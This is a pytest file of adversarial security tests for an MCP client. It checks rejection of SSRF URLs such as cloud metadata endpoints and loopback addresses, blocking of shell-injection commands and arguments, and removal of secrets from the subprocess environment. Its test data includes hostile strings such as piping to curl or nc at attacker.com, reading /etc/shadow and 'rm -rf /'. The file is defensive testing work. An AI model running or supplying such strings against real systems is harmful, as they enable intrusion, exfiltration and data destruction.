"""Adversarial security tests for MCP egress, SSRF defenses, and command injection hardening."""

import os
from unittest.mock import patch

import pytest

from db.models import MCPServer
from services.mcp_client import (
    GovernedMCPClient,
    MCPSecurityError,
    SafeSubprocessMCPClient,
    SSRFSafeMCPHttpClient,
    sanitize_subprocess_env,
)
from shared.schemas.mcp import MCPTrustStatus


class TestMCPEgressSSRFSecurity:
    """Validate that external HTTP-based MCP servers cannot be abused for SSRF or network reconnaissance."""

    @pytest.mark.parametrize(
        "prohibited_url",
        [
            # Loopback IPv4 variants
            "http://127.0.0.1:8080/mcp",
            "http://127.0.0.2:9000/mcp",
            "http://127.127.127.127:5432",
            "http://localhost:8000/mcp",
            "http://localhost.localdomain:8080",
            "http://sub.localhost:8080",
            # Loopback IPv6
            "http://[::1]:8080/mcp",
            "http://[0:0:0:0:0:0:0:1]:8080",
            "http://[::ffff:127.0.0.1]:8080",
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/meta-data",
            "http://169.254.169.254/computeMetadata/v1",
            "http://100.100.100.200/latest/meta-data",
            "http://metadata.google.internal/computeMetadata/v1",
            "http://instance-data/latest/meta-data",
            # Private RFC 1918 subnets
            "http://10.0.0.1:8080/mcp",
            "http://10.254.254.254:8080",
            "http://172.16.0.1:8080/mcp",
            "http://172.31.255.255:8080",
            "http://192.168.0.1:8080/mcp",
            "http://192.168.1.254:8080",
            # Link-local & Multicast
            "http://169.254.1.1:8080",
            "http://224.0.0.1:8080",
            # Prohibited schemes
            "file:///etc/passwd",
            "gopher://evil.com:70",
            "ftp://files.example.com",
            # Embedded credentials
            "http://admin:secret@trusted-api.com/mcp",
        ],
    )
    def test_ssrf_prohibited_endpoints_rejected(self, prohibited_url: str) -> None:
        """Every prohibited loopback, private, metadata, or credential-bearing URL must raise MCPSecurityError."""
        with pytest.raises(MCPSecurityError):
            SSRFSafeMCPHttpClient(url=prohibited_url)


class TestMCPCommandInjectionSecurity:
    """Validate that stdio subprocess MCP execution strictly prevents command and argument injection."""

    @pytest.mark.parametrize(
        "malicious_command",
        [
            "python; cat /etc/passwd",
            "python & whoami",
            "node && id",
            "tool | curl http://attacker.com",
            "tool `id`",
            "tool $(whoami)",
            "tool > /tmp/pwned",
            "tool < /dev/urandom",
            "tool\nrm -rf /",
            "tool\rrm -rf /",
            "../../bin/malicious",
            "..\\..\\cmd.exe",
        ],
    )
    def test_command_injection_rejected(self, malicious_command: str) -> None:
        """Any command containing shell metacharacters or directory traversal must be rejected."""
        with pytest.raises(MCPSecurityError) as exc_info:
            SafeSubprocessMCPClient(command=malicious_command)
        assert (
            "prohibited shell metacharacters" in str(exc_info.value)
            or "prohibited path traversal" in str(exc_info.value)
        )

    @pytest.mark.parametrize(
        "malicious_arg",
        [
            "; rm -rf /",
            "&& whoami",
            "| nc attacker.com 4444",
            "$(cat /etc/shadow)",
            "`id`",
            "> /dev/null",
            "foo\nbar",
        ],
    )
    def test_argument_injection_rejected(self, malicious_arg: str) -> None:
        """Arguments containing shell metacharacters must be rejected."""
        with pytest.raises(MCPSecurityError) as exc_info:
            SafeSubprocessMCPClient(command="python", args=["-m", "safe_module", malicious_arg])
        assert "prohibited shell metacharacters" in str(exc_info.value)


class TestMCPSubprocessEnvironmentIsolation:
    """Validate that sensitive credentials and database secrets are purged from child process environment."""

    def test_sensitive_credentials_purged(self) -> None:
        """All critical environment variables must be completely inaccessible to child processes."""
        host_env = {
            "PATH": "/usr/local/bin:/usr/bin",
            "LANG": "C.UTF-8",
            "JWT_SECRET_KEY": "jwt_secret_should_never_leak",
            "POSTGRES_PASSWORD": "database_admin_password",
            "DATABASE_URL": "postgresql://admin:secret@pg:5432/mirage",
            "AWS_SECRET_ACCESS_KEY": "AKIAIOSFODNN7EXAMPLE",
            "SENTRY_AUTH_TOKEN": "sentry_token_12345",
            "REDIS_PASSWORD": "redis_password_xyz",
            "MONGODB_URI": "mongodb://admin:pass@mongo:27017",
            "MIRAGE_ENCRYPTION_KEY": "enc_key_abc",
        }
        with patch.dict(os.environ, host_env, clear=True):
            clean = sanitize_subprocess_env({"SAFE_USER_FLAG": "true"})
            for sensitive_key in [
                "JWT_SECRET_KEY",
                "POSTGRES_PASSWORD",
                "DATABASE_URL",
                "AWS_SECRET_ACCESS_KEY",
                "SENTRY_AUTH_TOKEN",
                "REDIS_PASSWORD",
                "MONGODB_URI",
                "MIRAGE_ENCRYPTION_KEY",
            ]:
                assert sensitive_key not in clean


class TestMCPCircularityAndRecursionGuards:
    """Validate protection against recursive loops and circular Gateway re-entry."""

    @pytest.mark.asyncio
    async def test_circular_reentry_attempt_blocked(self) -> None:
        """Arguments containing MIRAGE Gateway action endpoints are rejected to prevent infinite execution loops."""
        client = GovernedMCPClient()
        server = MCPServer(
            id="mcp_srv_loop",
            tenant_id="tenant_alpha",
            name="Loop Server",
            trust_status=MCPTrustStatus.TRUSTED.value,
            transport_type="STDIO",
        )

        with pytest.raises(MCPSecurityError) as exc_info:
            await client.call_tool(
                server=server,
                raw_tool_name="loop_back",
                arguments={"webhook": "http://mirage/v1/actions/execute_action"},
            )
        assert "Circular or recursive invocation detected" in str(exc_info.value)
